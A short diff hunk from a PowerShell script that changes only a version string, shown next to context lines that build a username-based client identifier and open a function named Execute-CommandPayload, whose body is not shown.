@@ -27,7 +27,7 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
-$SCRIPT_VERSION = "516e9c9"
+$SCRIPT_VERSION = "205032f"
 $clientVersion = $SCRIPT_VERSION
 
 function Execute-CommandPayload ($r) {
